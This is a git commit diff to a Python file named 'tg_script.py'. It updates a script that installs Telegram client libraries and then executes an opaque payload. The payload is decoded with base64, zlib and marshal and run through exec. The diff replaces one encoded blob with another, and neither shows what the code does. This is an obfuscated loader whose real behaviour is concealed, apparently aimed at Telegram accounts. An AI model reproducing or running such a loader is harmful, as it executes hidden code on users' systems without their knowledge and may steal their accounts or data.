e813ff2b62c4a789a24a4e6a77592018025e6c6a
error657756 <bdbfbfbff966@gmail.com>
2025-04-24 17:52:32 +0330

    Update tg_script.py

--- tg_script.py
+++ tg_script.py
@@ -3,16 +3,13 @@ import sys
 import base64
 import zlib
 import marshal
-print("error not found?")
+print("01010")
 subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
 subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"])
 subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])
 
-with open(__file__, "r", encoding="utf-8") as f:
-    data = f.read()
-secure_data = data.split("# DATA")[1].strip()
+# DATA
+DATA = "eJxlUL2LE0EUn8/9iKtB2aAIsUkVUPFydyRKOFg5sTkERdTdZtlk5nK52w/Z2Rj1mpRaaeeVtnpX2Nnqf2AgkNzY2FjYCVcIVzlzHyjkDbw3vx+/33tvpgv+C+OkHnxR6R1ggMEYJDCAUN9RjALEcIAZCQgCHHK8R3fhsSWgnG46YC42z81zgaXcNreYsYuOmWUQlJT/4ryWE17aM091ag+kzz/8AtXAAhBwiCDwFdbMc+yDIaxbv7SkDiW+nRX3Xl5vtpqNG0vLrYWlW553NxSPtvw7i48f3mw9GHaa0bNrfPVJ0IgW1wap763ej7Eyk7WPMdUtaJFt8VSivFNH0uxuREXYZ9JiWXeQ8LSoO9IqeMx7eZTkejeJMiHtTlaER8acag4rLE3BhehnqbTW+zFPo4RL54QKNSNJ9lRNguvyrOApC09HfAAH+jmHVlsUeT/trUirnWRsEPOV3D36CgCEr9JvDCH8CS59B/YPpz2yZyV3ZO4b9lt7Ylwe4Vn5wpvt19vTcm1cro2cfWq/urpDJrT6/vyMmFNSGZPKTu8T/EYqE9L4g4FxZUqrY1o9FGdU98+u5+KvLvWq5l8VfIiU"
+secure_data = DATA
 payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
 exec(payload)
-
-# DATA
-eJxLZkACbFD68x4gMZ0hhSGFMYchlzGKkRHEZsphimJKYY5iZmJIZUxlXsOymhGiPIollSWLiwEDZPFgikWxA3VzpLKnsK5mgoiYMkRxAvWLYqpNYUvlXMMOUwd0AxMIIviVTMoMhgzFjOVMjAyRQD5IpII5kqGcUZPjJUiJJuMtZqf8Er8qPXMLcyMDE1MLQxMrR0f3+OKw7EhX4/AQS4ug8iTzxDLdVJeIKKNEY5/SvEhHl0CgPtaS/OzUvFtMRUm3uMyMLAyMzCwsDEw0mW6xJ2cklsRnptziSMlPLs1NzSvR5L7FUZKak5pelJhbBHLcLab84lucSfkl8RBDmIHMW+zFqcXFmfl5tzjSMnNS8xJzU2/xQIXiQSK3WPILgGoZ027xFqfmpcTDTF/J8BnklV8cNsUlRZl56Xa3OGxy81NKc1LtikTBwcDAUBwCJD4wMzIyPmWQuM3A+YDHpoHzJhvnBM4rbFINzDf4hfqrO6uv8ytf5Fdu4LnJytmhM4PlCqvsAsEbLOzXWUQvsojOyNkQeIFF9AqL+XdmBja566yyF1llfxVzAw3eKuIoxHxQiNVRmh0AbD2HKg==
